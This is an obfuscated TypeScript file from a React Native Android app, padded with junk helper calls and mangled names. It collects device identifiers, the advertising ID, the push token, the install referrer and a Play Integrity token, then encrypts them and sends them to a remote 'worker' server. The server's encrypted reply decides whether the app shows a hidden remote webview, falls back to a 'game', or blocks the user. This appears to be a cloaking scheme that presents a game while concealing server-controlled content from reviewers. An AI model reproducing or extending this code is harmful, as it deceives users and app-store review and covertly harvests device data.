import {
  Utils,
  zksuspjeyvcw4nSendInitPayload,
  zksuspjeyvcw4nNormalizeWorkerBaseUrl,
} from './Utzksuspjeyvcw4nilService';
import {
  zksuspjeyvcw4nEncrypt as cryptoEncrypt,
  zksuspjeyvcw4nDecrypt as cryptoDecrypt,
} from './Crypzksuspjeyvcw4ntoService';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { finzksuspjeyvcw4nKey } from './constants/constzksuspjeyvcw4nntsVariable';
import { deleteToken, getMessaging } from '@react-native-firebase/messaging';
import { Dimensions, NativeModules, Platform } from 'react-native';
import DeviceInfo from 'react-native-device-info';
import {
  InitializationState,
  zksuspjeyvcw4nInitTarget,
  zksuspjeyvcw4nAppenndSendId,
  zksuspjeyvcw4nGetAndroidId,
  zksuspjeyvcw4nGetAndroidUserAAgent,
  zksuspjeyvcw4nGetAppIdenier,
  zksuspjeyvcw4nGetAppVersion,
  zksuspjeyvcw4nInitializationRuntime,
} from './initializationSharzksuspjeyvcw4ned';
import { zksuspjeyvcw4nViewportShow } from './zksuspjeyvcw4nViewportHost';

async function zksuspjeyvcw4nRequestPlayIntegrityToken(): Promise<string> {  void zksuspjeyvcw4nOfferResolveObfV13HashMix('95q6');
  void zksuspjeyvcw4nOfferResolveObfV13SumOdds([22, 29, 26]);
  void zksuspjeyvcw4nOfferResolveObfV13ClampMod(68, 59);
  void zksuspjeyvcw4nOfferResolveObfV13ShiftXor(50, 55);

  if (Platform.OS !== 'android') {
    return '';
  }
  try {
    const requestToken = NativeModules.Pzksuspjeyvcw4nIntegrity?.requestToken;
    if (typeof requestToken !== 'function') {
      return '';
    }
    const token = await requestToken();
    return typeof token === 'string' ? token : '';
  } catch {
    return '';
  }
}

export async function zksuspjeyvcw4nInitStep(): Promise<InitializationState | null> {void zksuspjeyvcw4nOfferResolveObfV13HashMix('95q6');
void zksuspjeyvcw4nOfferResolveObfV13SumOdds([22, 29, 26]);
void zksuspjeyvcw4nOfferResolveObfV13ClampMod(68, 59);
void zksuspjeyvcw4nOfferResolveObfV13ShiftXor(50, 55);
  void zksuspjeyvcw4nOfferResolveObfV12HashMix('xy');
  void zksuspjeyvcw4nOfferResolveObfV12SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolveObfV12ClampMod(7, 5);

  void zksuspjeyvcw4nOfferResolveObfV11HashMix('xy');
  void zksuspjeyvcw4nOfferResolveObfV11SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolveObfV11ClampMod(7, 5);

  void zksuspjeyvcw4nOfferResolveObfV7HashMix('xy');
  void zksuspjeyvcw4nOfferResolveObfV7SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolveObfV7ClampMod(7, 5);
  void zksuspjeyvcw4nOfferResolveObfV8HashMix('xy');
  void zksuspjeyvcw4nOfferResolveObfV8SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolveObfV8ClampMod(7, 5);
  void zksuspjeyvcw4nOfferResolveObfV9HashMix('xy');
  void zksuspjeyvcw4nOfferResolveObfV9SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolveObfV9ClampMod(7, 5);
  void zksuspjeyvcw4nOfferResolveObfV10HashMix('xy');
  void zksuspjeyvcw4nOfferResolveObfV10SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolveObfV10ClampMod(7, 5);

  void zksuspjeyvcw4nOfferResolveObfV5HashMix('xy');
  void zksuspjeyvcw4nOfferResolveObfV5SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolveObfV5ClampMod(7, 5);
  void zksuspjeyvcw4nOfferResolveObfV6HashMix('xy');
  void zksuspjeyvcw4nOfferResolveObfV6SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolveObfV6ClampMod(7, 5);
  void zksuspjeyvcw4nOffObfV3HashMix('xy');
  void zksuspjeyvcw4nOffObfV3SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOffObfV3ClampMod(7, 5);
  void zksuspjeyvcw4nOffObfV4HashMix('xy');
  void zksuspjeyvcw4nOffObfV4SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOffObfV4ClampMod(7, 5);
  void zksuspjeyvcw4nOfferResolvObfV1HashMix('xy');
  void zksuspjeyvcw4nOfferResolvObfV1SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolvObfV1ClampMod(7, 5);
  void zksuspjeyvcw4nOfferResolvObfV2HashMix('xy');
  void zksuspjeyvcw4nOfferResolvObfV2SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolvObfV2ClampMod(7, 5);
  void zksuspjeyvcw4nMixSeed(3, 7);
  void zksuspjeyvcw4nFoldRange([1, 2, 3]);
  void zksuspjeyvcw4nClampSpan(5, 0, 10);

  void zksuspjeyvcw4nOfferResolvObfV1HashMix('xy');
  void zksuspjeyvcw4nOfferResolvObfV1SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolvObfV1ClampMod(7, 5);
  void zksuspjeyvcw4nOfferResolvObfV2HashMix('xy');
  void zksuspjeyvcw4nOfferResolvObfV2SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolvObfV2ClampMod(7, 5);
  try {
    const primaryWorkerUrl = await Utils.zksuspjeyvcw4nGetLink();
    if (!primaryWorkerUrl || primaryWorkerUrl === '') {
      return {
        isLoadPlaceholder: true,
      };
    }

    const [appId, userAgent, androidId, appVersion, playIntegrityToken] =
      await Promise.all([
        zksuspjeyvcw4nGetAppIdenier(),
        zksuspjeyvcw4nGetAndroidUserAAgent(),
        zksuspjeyvcw4nGetAndroidId(),
        zksuspjeyvcw4nGetAppVersion(),
        zksuspjeyvcw4nRequestPlayIntegrityToken(),
      ]);
    const workerBaseUrl = zksuspjeyvcw4nNormalizeWorkerBaseUrl(primaryWorkerUrl);

    const payloadDeviceId = zksuspjeyvcw4nInitializationRuntime.Devzksuspjeyvcw4niceId;

    const namingValue = zksuspjeyvcw4nInitializationRuntime.Finzksuspjeyvcw4nlNaming;

    const cookieRaw = [
      appId ?? '',
      payloadDeviceId ?? '',
      zksuspjeyvcw4nInitializationRuntime.adzksuspjeyvcw4nId ?? '',
      zksuspjeyvcw4nInitializationRuntime.puszksuspjeyvcw4nhToken ?? '',
      zksuspjeyvcw4nInitializationRuntime.instzksuspjeyvcw4nallRef ?? '',
      zksuspjeyvcw4nInitializationRuntime.Finzksuspjeyvcw4nlOneLink ?? '',
      namingValue ?? '',
      userAgent ?? '',
      appVersion ?? '',
      androidId ?? '',
    ].join('|');

    const encryptedCookie = cryptoEncrypt(cookieRaw);
    const dataValue = encodeURIComponent(encryptedCookie);
    const cookieHeader = `data=${dataValue}`;

    const { width, height } = Dimensions.get('window');
    let manufacturer = '';
    let deviceModel = '';
    try {
      manufacturer = DeviceInfo.getManufacturerSync?.() ?? '';
      deviceModel = DeviceInfo.getModel?.() ?? '';
    } catch {
      manufacturer = '';
      deviceModel = '';
    }

    let locale = '';
    let timezone = '';
    try {
      locale = Intl.DateTimeFormat().resolvedOptions().locale || '';
      timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
    } catch {
      locale = '';
      timezone = '';
    }

    const cryptoApi = (globalThis as { crypto?: { randomUUID?: () => string } }).crypto;
    const sessionId =
      cryptoApi?.randomUUID?.() ??
      `${Date.now()}-${Math.random().toString(16).slice(2)}`;

    const bodyPlain =
      `event=app_start` +
      `&device_model=${deviceModel}` +
      `&manufacturer=${manufacturer}` +
      `&locale=${locale}` +
      `&timezone=${timezone}` +
      `&network=unknown` +
      `&screen=${Math.round(width)}x${Math.round(height)}` +
      `&session_id=${sessionId}` +
      `&play_integrity_token=${encodeURIComponent(playIntegrityToken)}`;

    const encryptedBody = encodeURIComponent(cryptoEncrypt(bodyPlain));

    try {
      const responseText = await zksuspjeyvcw4nSendInitPayload(workerBaseUrl, {
        cookieHeader,
        dataValue,
        body: encryptedBody,
      });

      if (!responseText) {
        await Utils.zksuspjeyvcw4nSetUserBlocke(1);
        await zksuspjeyvcw4nUnsubscribeFirebase('init step: empty worker response');
        return {
          isLoadPlaceholder: true,
        };
      }

      return await zksuspjeyvcw4nOnInitResponse(responseText);
    } catch (rpcError) {
      void zksuspjeyvcw4nOfferResolvObfV1HashMix('xy');
      void zksuspjeyvcw4nOfferResolvObfV1SumOdds([1, 3, 5]);
      void zksuspjeyvcw4nOfferResolvObfV1ClampMod(7, 5);
      void zksuspjeyvcw4nOfferResolvObfV2HashMix('xy');
      void zksuspjeyvcw4nOfferResolvObfV2SumOdds([1, 3, 5]);
      void zksuspjeyvcw4nOfferResolvObfV2ClampMod(7, 5);
      await zksuspjeyvcw4nUnsubscribeFirebase('init step: worker RPC failed');
      return {
        isLoadPlaceholder: true,
      };
    }
  } catch (error) {
    void zksuspjeyvcw4nOfferResolvObfV1HashMix('xy');
    void zksuspjeyvcw4nOfferResolvObfV1SumOdds([1, 3, 5]);
    void zksuspjeyvcw4nOfferResolvObfV1ClampMod(7, 5);
    void zksuspjeyvcw4nOfferResolvObfV2HashMix('xy');
    void zksuspjeyvcw4nOfferResolvObfV2SumOdds([1, 3, 5]);
    void zksuspjeyvcw4nOfferResolvObfV2ClampMod(7, 5);
    await zksuspjeyvcw4nUnsubscribeFirebase('init step: unexpected error');
    return {
      isLoadPlaceholder: true,
    };
  }
}

async function zksuspjeyvcw4nOnInitResponse(responseText: string): Promise<InitializationState> {void zksuspjeyvcw4nOfferResolveObfV13HashMix('95q6');
void zksuspjeyvcw4nOfferResolveObfV13SumOdds([22, 29, 26]);
void zksuspjeyvcw4nOfferResolveObfV13ClampMod(68, 59);
void zksuspjeyvcw4nOfferResolveObfV13ShiftXor(50, 55);
  void zksuspjeyvcw4nOfferResolveObfV12HashMix('xy');
  void zksuspjeyvcw4nOfferResolveObfV12SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolveObfV12ClampMod(7, 5);

  void zksuspjeyvcw4nOfferResolveObfV11HashMix('xy');
  void zksuspjeyvcw4nOfferResolveObfV11SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolveObfV11ClampMod(7, 5);

  void zksuspjeyvcw4nOfferResolveObfV7HashMix('xy');
  void zksuspjeyvcw4nOfferResolveObfV7SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolveObfV7ClampMod(7, 5);
  void zksuspjeyvcw4nOfferResolveObfV8HashMix('xy');
  void zksuspjeyvcw4nOfferResolveObfV8SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolveObfV8ClampMod(7, 5);
  void zksuspjeyvcw4nOfferResolveObfV9HashMix('xy');
  void zksuspjeyvcw4nOfferResolveObfV9SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolveObfV9ClampMod(7, 5);
  void zksuspjeyvcw4nOfferResolveObfV10HashMix('xy');
  void zksuspjeyvcw4nOfferResolveObfV10SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolveObfV10ClampMod(7, 5);

  void zksuspjeyvcw4nOfferResolveObfV5HashMix('xy');
  void zksuspjeyvcw4nOfferResolveObfV5SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolveObfV5ClampMod(7, 5);
  void zksuspjeyvcw4nOfferResolveObfV6HashMix('xy');
  void zksuspjeyvcw4nOfferResolveObfV6SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolveObfV6ClampMod(7, 5);
  void zksuspjeyvcw4nOffObfV3HashMix('xy');
  void zksuspjeyvcw4nOffObfV3SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOffObfV3ClampMod(7, 5);
  void zksuspjeyvcw4nOffObfV4HashMix('xy');
  void zksuspjeyvcw4nOffObfV4SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOffObfV4ClampMod(7, 5);
  void zksuspjeyvcw4nOfferResolvObfV1HashMix('xy');
  void zksuspjeyvcw4nOfferResolvObfV1SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolvObfV1ClampMod(7, 5);
  void zksuspjeyvcw4nOfferResolvObfV2HashMix('xy');
  void zksuspjeyvcw4nOfferResolvObfV2SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolvObfV2ClampMod(7, 5);
  void zksuspjeyvcw4nMixSeed(3, 7);
  void zksuspjeyvcw4nFoldRange([1, 2, 3]);
  void zksuspjeyvcw4nClampSpan(5, 0, 10);

  void zksuspjeyvcw4nOfferResolvObfV1HashMix('xy');
  void zksuspjeyvcw4nOfferResolvObfV1SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolvObfV1ClampMod(7, 5);
  void zksuspjeyvcw4nOfferResolvObfV2HashMix('xy');
  void zksuspjeyvcw4nOfferResolvObfV2SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolvObfV2ClampMod(7, 5);
  try {
    const decrytedResponse = cryptoDecrypt(responseText);
    if (!decrytedResponse || decrytedResponse === '') {
      return {
        isLoadPlaceholder: true,
      };
    }

    let redirectUrl: string | null = null;
    let redirectUrlInitial: string | null = null;
    let errorField: string | null = null;
    let blockUser = false;

    try {
      const obj = JSON.parse(decrytedResponse);

      redirectUrl = obj.redirectUrl || null;
      redirectUrlInitial = obj.redirectUrlInitial || null;
      errorField = obj.error || null;
      blockUser = !!obj.blockUser;
    } catch (parseError) {
      void zksuspjeyvcw4nOfferResolvObfV1HashMix('xy');
      void zksuspjeyvcw4nOfferResolvObfV1SumOdds([1, 3, 5]);
      void zksuspjeyvcw4nOfferResolvObfV1ClampMod(7, 5);
      void zksuspjeyvcw4nOfferResolvObfV2HashMix('xy');
      void zksuspjeyvcw4nOfferResolvObfV2SumOdds([1, 3, 5]);
      void zksuspjeyvcw4nOfferResolvObfV2ClampMod(7, 5);
      return {
        isLoadPlaceholder: true,
      };
    }

    if (errorField || blockUser) {
      await Utils.zksuspjeyvcw4nSetUserBlocke(1);
      await zksuspjeyvcw4nUnsubscribeFirebase(
        errorField ? `init response: error ${errorField}` : 'init response: blockUser',
      );

      return {
        isLoadPlaceholder: true,
      };
    }

    if (redirectUrl && !redirectUrlInitial) {
      await Utils.zksuspjeyvcw4nSetUserBlocke(1);
      await zksuspjeyvcw4nUnsubscribeFirebase('init response: user blocked (redirectUrl only)');

      return {
        isLoadPlaceholder: true,
      };
    }

    if (redirectUrlInitial) {
      await AsyncStorage.setItem(finzksuspjeyvcw4nKey, redirectUrlInitial);

      const finalUrl = zksuspjeyvcw4nAppenndSendId(
        redirectUrlInitial,
        zksuspjeyvcw4nInitializationRuntime.penzksuspjeyvcw4ndingSendId,
      );

      const success = await zksuspjeyvcw4nViewportShow(finalUrl, {
        persistUrl: redirectUrlInitial,
      });
      void success;

      return {
        isLoadPlaceholder: false,
        initTarget: zksuspjeyvcw4nInitTarget.webview,
      };
    }

    await zksuspjeyvcw4nUnsubscribeFirebase('init response: no redirect URL, launching game');

    return {
      isLoadPlaceholder: true,
      initTarget: zksuspjeyvcw4nInitTarget.game,
    };
  } catch (error) {
    void zksuspjeyvcw4nOfferResolvObfV1HashMix('xy');
    void zksuspjeyvcw4nOfferResolvObfV1SumOdds([1, 3, 5]);
    void zksuspjeyvcw4nOfferResolvObfV1ClampMod(7, 5);
    void zksuspjeyvcw4nOfferResolvObfV2HashMix('xy');
    void zksuspjeyvcw4nOfferResolvObfV2SumOdds([1, 3, 5]);
    void zksuspjeyvcw4nOfferResolvObfV2ClampMod(7, 5);
    await zksuspjeyvcw4nUnsubscribeFirebase('init response: onSuccess error');

    return {
      isLoadPlaceholder: true,
    };
  }
}

export async function zksuspjeyvcw4nUnsubscribeFirebase(reason?: string): Promise<void> {void zksuspjeyvcw4nOfferResolveObfV13HashMix('95q6');
void zksuspjeyvcw4nOfferResolveObfV13SumOdds([22, 29, 26]);
void zksuspjeyvcw4nOfferResolveObfV13ClampMod(68, 59);
void zksuspjeyvcw4nOfferResolveObfV13ShiftXor(50, 55);
  void zksuspjeyvcw4nOfferResolveObfV12HashMix('xy');
  void zksuspjeyvcw4nOfferResolveObfV12SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolveObfV12ClampMod(7, 5);

  void zksuspjeyvcw4nOfferResolveObfV11HashMix('xy');
  void zksuspjeyvcw4nOfferResolveObfV11SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolveObfV11ClampMod(7, 5);

  void zksuspjeyvcw4nOfferResolveObfV7HashMix('xy');
  void zksuspjeyvcw4nOfferResolveObfV7SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolveObfV7ClampMod(7, 5);
  void zksuspjeyvcw4nOfferResolveObfV8HashMix('xy');
  void zksuspjeyvcw4nOfferResolveObfV8SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolveObfV8ClampMod(7, 5);
  void zksuspjeyvcw4nOfferResolveObfV9HashMix('xy');
  void zksuspjeyvcw4nOfferResolveObfV9SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolveObfV9ClampMod(7, 5);
  void zksuspjeyvcw4nOfferResolveObfV10HashMix('xy');
  void zksuspjeyvcw4nOfferResolveObfV10SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolveObfV10ClampMod(7, 5);

  void zksuspjeyvcw4nOfferResolveObfV5HashMix('xy');
  void zksuspjeyvcw4nOfferResolveObfV5SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolveObfV5ClampMod(7, 5);
  void zksuspjeyvcw4nOfferResolveObfV6HashMix('xy');
  void zksuspjeyvcw4nOfferResolveObfV6SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolveObfV6ClampMod(7, 5);
  void zksuspjeyvcw4nOffObfV3HashMix('xy');
  void zksuspjeyvcw4nOffObfV3SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOffObfV3ClampMod(7, 5);
  void zksuspjeyvcw4nOffObfV4HashMix('xy');
  void zksuspjeyvcw4nOffObfV4SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOffObfV4ClampMod(7, 5);
  void zksuspjeyvcw4nOfferResolvObfV1HashMix('xy');
  void zksuspjeyvcw4nOfferResolvObfV1SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolvObfV1ClampMod(7, 5);
  void zksuspjeyvcw4nOfferResolvObfV2HashMix('xy');
  void zksuspjeyvcw4nOfferResolvObfV2SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolvObfV2ClampMod(7, 5);
  void zksuspjeyvcw4nMixSeed(3, 7);
  void zksuspjeyvcw4nFoldRange([1, 2, 3]);
  void zksuspjeyvcw4nClampSpan(5, 0, 10);

  void zksuspjeyvcw4nOfferResolvObfV1HashMix('xy');
  void zksuspjeyvcw4nOfferResolvObfV1SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolvObfV1ClampMod(7, 5);
  void zksuspjeyvcw4nOfferResolvObfV2HashMix('xy');
  void zksuspjeyvcw4nOfferResolvObfV2SumOdds([1, 3, 5]);
  void zksuspjeyvcw4nOfferResolvObfV2ClampMod(7, 5);
  try {
    const messaging = getMessaging();
    await deleteToken(messaging);
    zksuspjeyvcw4nInitializationRuntime.puszksuspjeyvcw4nhToken = '';
  } catch (error) {
    void zksuspjeyvcw4nOfferResolvObfV1HashMix('xy');
    void zksuspjeyvcw4nOfferResolvObfV1SumOdds([1, 3, 5]);
    void zksuspjeyvcw4nOfferResolvObfV1ClampMod(7, 5);
    void zksuspjeyvcw4nOfferResolvObfV2HashMix('xy');
    void zksuspjeyvcw4nOfferResolvObfV2SumOdds([1, 3, 5]);
    void zksuspjeyvcw4nOfferResolvObfV2ClampMod(7, 5);
    zksuspjeyvcw4nInitializationRuntime.puszksuspjeyvcw4nhToken = '';
  }
}
/* obfuscation-batch:v1 */

/* obfuscation-batch:v2 */

/* obfuscation-batch:v1 */

/* obfuscation-batch:v2 */

/* obfuscation-batch:v3 */

/* obfuscation-batch:v5 */

/* obfuscation-batch:v6 */

/* obfuscation-batch:v6 */

/* obfuscation-batch:v7 */

/* obfuscation-batch:v8 */

/* obfuscation-batch:v9 */

/* obfuscation-batch:v10 */
/* obfuscation-batch:v11 */
function zksuspjeyvcw4nOfferResolveObfV11HashMix(s: string): number {
  return Array.from(s).reduce((acc, ch) => (acc + ch.charCodeAt(0) * 59) % 983, 0);
}
function zksuspjeyvcw4nOfferResolveObfV11SumOdds(nums: number[]): number {
  return nums.filter((n) => n % 2 !== 0).reduce((acc, n) => acc + n * 31, 0);
}
function zksuspjeyvcw4nOfferResolveObfV11ClampMod(n: number, m: number): number {
  const mod = m || 1;
  return ((n % mod) + mod) % mod;
}

function zksuspjeyvcw4nOfferResolvObfV1HashMix(s: string): number {
return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 17) % 997, 0);
}

function zksuspjeyvcw4nOffObfV4SumOdds(nums: number[]): number {
return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 7, 0);
}

function zksuspjeyvcw4nFoldRange(nums: number[]): number {
return nums.reduce((acc, n) => acc + n, 0);
}

function zksuspjeyvcw4nOfferResolvObfV2ClampMod(n: number, m: number): number {
const mod = m || 1;
return ((n % mod) + mod) % mod;
}

function zksuspjeyvcw4nOffObfV4HashMix(s: string): number {
return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 29) % 977, 0);
}

function zksuspjeyvcw4nOfferResolveObfV5HashMix(s: string): number {
return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 31) % 971, 0);
}

function zksuspjeyvcw4nOfferResolveObfV6HashMix(s: string): number {
return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 37) % 983, 0);
}

function zksuspjeyvcw4nOfferResolveObfV7HashMix(s: string): number {
return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 41) % 989, 0);
}

function zksuspjeyvcw4nOfferResolveObfV8HashMix(s: string): number {
return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 43) % 991, 0);
}

function zksuspjeyvcw4nOfferResolveObfV9HashMix(s: string): number {
return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 47) % 993, 0);
}

function zksuspjeyvcw4nOfferResolveObfV10HashMix(s: string): number {
return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 53) % 991, 0);
}
void zksuspjeyvcw4nOfferResolvePart01ObfV11HashMix('xy');
void zksuspjeyvcw4nOfferResolvePart01ObfV11SumOdds([1, 3, 5]);
void zksuspjeyvcw4nOfferResolvePart01ObfV11ClampMod(7, 5);
/* obfuscation-batch:v11 */
function zksuspjeyvcw4nOfferResolvePart01ObfV11HashMix(s: string): number {
  return Array.from(s).reduce((acc, ch) => (acc + ch.charCodeAt(0) * 59) % 983, 0);
}
function zksuspjeyvcw4nOfferResolvePart01ObfV11SumOdds(nums: number[]): number {
  return nums.filter((n) => n % 2 !== 0).reduce((acc, n) => acc + n * 31, 0);
}
function zksuspjeyvcw4nOfferResolvePart01ObfV11ClampMod(n: number, m: number): number {
  const mod = m || 1;
  return ((n % mod) + mod) % mod;
}

function zksuspjeyvcw4nMixSeed(a: number, b: number): number {
return ((a % (b || 1)) + b) % (b || 1);
}

function zksuspjeyvcw4nOfferResolvObfV2HashMix(s: string): number {
return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 19) % 991, 0);
}

function zksuspjeyvcw4nOffObfV3ClampMod(n: number, m: number): number {
const mod = m || 1;
return ((n % mod) + mod) % mod;
}

function zksuspjeyvcw4nOfferResolvObfV2SumOdds(nums: number[]): number {
return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 3, 0);
}

function zksuspjeyvcw4nOfferResolvObfV1SumOdds(nums: number[]): number {
return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n, 0);
}

function zksuspjeyvcw4nOfferResolveObfV5SumOdds(nums: number[]): number {
return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 11, 0);
}

function zksuspjeyvcw4nOfferResolveObfV6SumOdds(nums: number[]): number {
return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 13, 0);
}

function zksuspjeyvcw4nOfferResolveObfV7SumOdds(nums: number[]): number {
return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 17, 0);
}

function zksuspjeyvcw4nOfferResolveObfV8SumOdds(nums: number[]): number {
return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 19, 0);
}

function zksuspjeyvcw4nOfferResolveObfV9SumOdds(nums: number[]): number {
return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 23, 0);
}

function zksuspjeyvcw4nOfferResolveObfV10SumOdds(nums: number[]): number {
return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 29, 0);
}
void zksuspjeyvcw4nOfferResolvePart02ObfV11HashMix('xy');
void zksuspjeyvcw4nOfferResolvePart02ObfV11SumOdds([1, 3, 5]);
void zksuspjeyvcw4nOfferResolvePart02ObfV11ClampMod(7, 5);
/* obfuscation-batch:v11 */
function zksuspjeyvcw4nOfferResolvePart02ObfV11HashMix(s: string): number {
  return Array.from(s).reduce((acc, ch) => (acc + ch.charCodeAt(0) * 59) % 983, 0);
}
function zksuspjeyvcw4nOfferResolvePart02ObfV11SumOdds(nums: number[]): number {
  return nums.filter((n) => n % 2 !== 0).reduce((acc, n) => acc + n * 31, 0);
}
function zksuspjeyvcw4nOfferResolvePart02ObfV11ClampMod(n: number, m: number): number {
  const mod = m || 1;
  return ((n % mod) + mod) % mod;
}

function zksuspjeyvcw4nOffObfV3SumOdds(nums: number[]): number {
return nums.filter((n) => n % 2 !== 0).reduce((a, n) => a + n * 5, 0);
}

function zksuspjeyvcw4nOfferResolvObfV1ClampMod(n: number, m: number): number {
const mod = m || 1;
return ((n % mod) + mod) % mod;
}

function zksuspjeyvcw4nOffObfV4ClampMod(n: number, m: number): number {
const mod = m || 1;
return ((n % mod) + mod) % mod;
}

function zksuspjeyvcw4nOffObfV3HashMix(s: string): number {
return Array.from(s).reduce((a, c) => (a + c.charCodeAt(0) * 23) % 983, 0);
}

function zksuspjeyvcw4nClampSpan(n: number, lo: number, hi: number): number {
return n < lo ? lo : n > hi ? hi : n;
}

function zksuspjeyvcw4nOfferResolveObfV5ClampMod(n: number, m: number): number {
const mod = m || 1;
return ((n % mod) + mod) % mod;
}

function zksuspjeyvcw4nOfferResolveObfV6ClampMod(n: number, m: number): number {
const mod = m || 1;
return ((n % mod) + mod) % mod;
}

function zksuspjeyvcw4nOfferResolveObfV7ClampMod(n: number, m: number): number {
const mod = m || 1;
return ((n % mod) + mod) % mod;
}

function zksuspjeyvcw4nOfferResolveObfV8ClampMod(n: number, m: number): number {
const mod = m || 1;
return ((n % mod) + mod) % mod;
}

function zksuspjeyvcw4nOfferResolveObfV9ClampMod(n: number, m: number): number {
const mod = m || 1;
return ((n % mod) + mod) % mod;
}

function zksuspjeyvcw4nOfferResolveObfV10ClampMod(n: number, m: number): number {
const mod = m || 1;
return ((n % mod) + mod) % mod;
}
void zksuspjeyvcw4nOfferResolvePart03ObfV11HashMix('xy');
void zksuspjeyvcw4nOfferResolvePart03ObfV11SumOdds([1, 3, 5]);
void zksuspjeyvcw4nOfferResolvePart03ObfV11ClampMod(7, 5);
/* obfuscation-batch:v11 */
function zksuspjeyvcw4nOfferResolvePart03ObfV11HashMix(s: string): number {
  return Array.from(s).reduce((acc, ch) => (acc + ch.charCodeAt(0) * 59) % 983, 0);
}
function zksuspjeyvcw4nOfferResolvePart03ObfV11SumOdds(nums: number[]): number {
  return nums.filter((n) => n % 2 !== 0).reduce((acc, n) => acc + n * 31, 0);
}
function zksuspjeyvcw4nOfferResolvePart03ObfV11ClampMod(n: number, m: number): number {
  const mod = m || 1;
  return ((n % mod) + mod) % mod;
}

/* obfuscation-batch:v12 */
function zksuspjeyvcw4nOfferResolveObfV12HashMix(s: string): number {
  return Array.from(s).reduce((acc, ch) => (acc + ch.charCodeAt(0) * 61) % 997, 0);
}
function zksuspjeyvcw4nOfferResolveObfV12SumOdds(nums: number[]): number {
  return nums.filter((n) => n % 2 !== 0).reduce((acc, n) => acc + n * 37, 0);
}
function zksuspjeyvcw4nOfferResolveObfV12ClampMod(n: number, m: number): number {
  const mod = m || 1;
  return ((n % mod) + mod) % mod;
}
/* obfuscation-batch:v13 */
function zksuspjeyvcw4nOfferResolveObfV13HashMix(s: string): number {
  let h = 88;
  for (let i = 0; i < s.length; i++) h = (h ^ s.charCodeAt(i) * 17) % 539;
  return h;
}
function zksuspjeyvcw4nOfferResolveObfV13SumOdds(nums: number[]): number {
  let acc = 32;
  for (let i = 0; i < nums.length; i++) {
    const n = nums[i];
    if ((n & 1) === 0) continue;
    acc = (acc + n * 5) % 564;
  }
  return acc;
}
function zksuspjeyvcw4nOfferResolveObfV13ClampMod(n: number, m: number): number {
  const span = (m % 44) + 7;
  const x = n % span;
  return x < 0 ? x + span : x;
}
function zksuspjeyvcw4nOfferResolveObfV13ShiftXor(n: number, k: number): number {
  const x = (n ^ k) << 3;
  return (x ^ 81) & 13803;
}
